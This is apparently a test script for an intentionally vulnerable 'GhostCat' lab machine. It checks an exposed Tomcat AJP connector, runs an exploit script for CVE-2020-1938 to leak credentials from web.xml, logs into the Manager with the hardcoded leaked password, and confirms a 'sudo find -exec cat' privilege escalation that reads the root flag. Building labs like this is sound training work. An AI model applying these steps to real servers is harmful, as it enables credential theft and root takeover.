#!/bin/bash
# Machine 07: GhostCat — CVE-2020-1938 Test
# Tests: Tomcat AJP on 8009, HTTP on 8080, WEB-INF/web.xml read, Manager access, sudo find privesc
source "$(dirname "$0")/_lib.sh"

BASE_DIR=${1:-$(dirname "$(dirname "$0")")}
CLEANUP=${2:-true}
MACHINE_DIR="$BASE_DIR/07-ghostcat"
COMPOSE="$MACHINE_DIR/docker-compose.yml"
CONTAINER="lm-07-ghostcat"
IP="10.10.7.10"

trap '[ "$CLEANUP" = true ] && stop_machine "$COMPOSE"' EXIT

section "Build & Start"
start_machine "$COMPOSE" "$CONTAINER" 120 || finish

section "Network Checks"
check_port "$IP" 8009 "Tomcat AJP (CVE-2020-1938 surface)"
check_port "$IP" 8080 "Tomcat HTTP"
check_port "$IP" 22   "SSH"

section "Tomcat HTTP App"
check_http "http://${IP}:8080/app/" 200 "Target webapp"
check_http_contains "http://${IP}:8080/app/" "Internal Management Portal" "App content"
check_http "http://${IP}:8080/manager/" 401 "Manager (requires auth)"

section "AJP Connector Config"
check_exec "$CONTAINER" "grep -i 'secretRequired' /opt/tomcat/conf/server.xml" 'secretRequired="false"' "AJP secretRequired=false"
check_exec "$CONTAINER" "grep -i 'port=\"8009\"' /opt/tomcat/conf/server.xml" '8009' "AJP port 8009 configured"

section "CVE-2020-1938: WEB-INF/web.xml Credential Leak"
# Use the Python exploit to read web.xml via AJP
if command -v python3 &>/dev/null; then
  exploit_out=$(cd "$MACHINE_DIR/writeup" && python3 exploit.py \
    --target "$IP" --file /WEB-INF/web.xml 2>/dev/null || true)

  if echo "$exploit_out" | grep -q "GhostC4t2020"; then
    pass "Ghostcat AJP file read CONFIRMED — credentials leaked from WEB-INF/web.xml"
    info "Leaked: $(echo "$exploit_out" | grep -i "adminPassword" | head -1)"
  elif echo "$exploit_out" | grep -q "web-app\|servlet"; then
    pass "WEB-INF/web.xml read via AJP (XML returned)"
    warn "Credential parsing may need tuning"
  else
    warn "AJP exploit output unclear — may need target network route"
    info "Output: $(echo "$exploit_out" | head -5)"
  fi
else
  warn "python3 not found — skipping live AJP exploit test"
fi

section "Credential Consistency"
# web.xml and tomcat-users.xml must have matching passwords
webxml_pass=$(grep -A1 "adminPassword" "$MACHINE_DIR/config/web.xml" | grep param-value | sed 's/.*<param-value>\(.*\)<\/param-value>.*/\1/')
users_pass=$(grep 'username="tomcatadmin"' "$MACHINE_DIR/config/tomcat-users.xml" | grep -o 'password="[^"]*"' | cut -d'"' -f2)
if [ "$webxml_pass" = "$users_pass" ]; then
  pass "Credentials consistent: web.xml == tomcat-users.xml ('${webxml_pass}')"
else
  fail "Credential mismatch: web.xml='$webxml_pass' vs tomcat-users.xml='$users_pass'"
fi

section "Tomcat Manager Auth"
check_http "http://tomcatadmin:GhostC4t2020%21@${IP}:8080/manager/text/list" 200 "Manager auth with leaked creds"

section "Flags"
check_exec "$CONTAINER" "cat /root/root.txt" "FLAG{" "Root flag"
check_exec "$CONTAINER" "cat /home/user/user.txt" "FLAG{" "User flag"

section "Sudo Privesc"
check_exec "$CONTAINER" "grep find /etc/sudoers.d/tomcat 2>/dev/null || sudo -l -U tomcat 2>/dev/null | grep find" "find" "tomcat can sudo find"
check_exec "$CONTAINER" "su tomcat -s /bin/bash -c 'sudo find /root/root.txt -exec cat {} \\;' 2>/dev/null" "FLAG{" "sudo find reads root flag"

finish
